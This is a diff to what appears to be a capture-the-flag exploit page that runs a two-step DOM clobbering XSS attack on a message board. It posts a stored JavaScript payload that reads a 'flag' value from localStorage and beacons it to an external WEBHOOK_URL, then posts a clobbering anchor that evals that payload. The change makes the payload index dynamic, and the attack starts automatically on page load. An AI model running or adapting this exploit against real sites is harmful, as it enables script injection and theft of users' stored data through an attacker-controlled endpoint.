@@ -15,16 +15,22 @@
         console.log('[TWO-STEP-ATTACK] Starting two-step DOM Clobbering attack');
         
         // Step 1: JavaScript payload (stored as message content, not executed immediately)
-        const javascriptPayload = `*/(new Image).src="${WEBHOOK_URL}?flag="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")+"&source=TWO_STEP_SUCCESS&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now()//`;
+        const javascriptPayload = `*/(new Image).src="${WEBHOOK_URL}?flag="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")+"&source=DOM_CLOBBERING_XSS&t="+Date.now()//`;
         
-        // Step 2: DOM Clobbering payload (references the first message)
-        const domClobberingPayload = `<a id=utilsJS></a><a id=utilsJS name=url href="javascript:eval(Messages[0].split(':::')[1])"></a>`;
         
         async function executeAttack() {
             try {
+                // First, get the current message count to calculate the correct index
+                console.log('[TWO-STEP-ATTACK] Getting current message count...');
+                const countResponse = await fetch(CHALLENGE_ORIGIN + '/messages?count=1');
+                const countData = await countResponse.json();
+                const currentMessageCount = countData.count;
+                
+                console.log('[TWO-STEP-ATTACK] Current message count:', currentMessageCount);
+                
                 console.log('[TWO-STEP-ATTACK] Step 1: Posting JavaScript payload message...');
                 
-                // Post the JavaScript payload as message 0
+                // Post the JavaScript payload - this will be at index currentMessageCount
                 const response1 = await fetch(CHALLENGE_ORIGIN + '/messages', {
                     method: 'POST',
                     headers: {
@@ -48,7 +54,10 @@
                 
                 console.log('[TWO-STEP-ATTACK] Step 2: Posting DOM Clobbering payload...');
                 
-                // Post the DOM Clobbering payload as message 1
+                // Create DOM Clobbering payload that references the JavaScript payload at the correct index
+                const dynamicDomClobberingPayload = `<a id=utilsJS></a><a id=utilsJS name=url href="javascript:eval(Messages[${currentMessageCount}].split(':::')[1])"></a>`;
+                
+                // Post the DOM Clobbering payload
                 const response2 = await fetch(CHALLENGE_ORIGIN + '/messages', {
                     method: 'POST',
                     headers: {
@@ -56,7 +65,7 @@
                     },
                     body: JSON.stringify({ 
                         name: 'Attacker2', 
-                        message: domClobberingPayload 
+                        message: dynamicDomClobberingPayload 
                     }),
                     credentials: 'include'
                 });
@@ -69,7 +78,7 @@
                 
                 // Send success notification
                 const img = new Image();
-                img.src = WEBHOOK_URL + '?event=MESSAGES_POSTED&status=success&step=both&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
+                img.src = WEBHOOK_URL + '?event=MESSAGES_POSTED&status=success&t=' + Date.now();
                 
                 // Wait a moment then redirect to trigger the attack
                 await new Promise(resolve => setTimeout(resolve, 1500));
@@ -80,7 +89,7 @@
             } catch (error) {
                 console.error('[TWO-STEP-ATTACK] Attack failed:', error);
                 const img = new Image();
-                img.src = WEBHOOK_URL + '?event=ATTACK_FAILED&error=' + encodeURIComponent(error.message) + '&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
+                img.src = WEBHOOK_URL + '?event=ATTACK_FAILED&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
             }
         }
         
@@ -88,7 +97,7 @@
         window.addEventListener('load', () => {
             console.log('[TWO-STEP-ATTACK] Page loaded, starting attack...');
             const img = new Image();
-            img.src = WEBHOOK_URL + '?event=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
+            img.src = WEBHOOK_URL + '?event=ATTACK_PAGE_LOADED&t=' + Date.now();
             
             executeAttack();
         });
